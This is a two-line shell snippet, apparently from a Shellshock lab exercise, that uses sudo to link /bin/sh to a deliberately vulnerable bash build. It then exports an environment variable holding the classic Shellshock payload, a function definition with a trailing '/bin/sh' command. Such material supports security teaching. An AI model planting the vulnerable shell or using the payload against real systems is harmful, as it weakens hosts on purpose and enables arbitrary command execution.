sudo ln -sf /bin/bash_shellshock /bin/sh
export foo='() { echo "hello"; }; /bin/sh'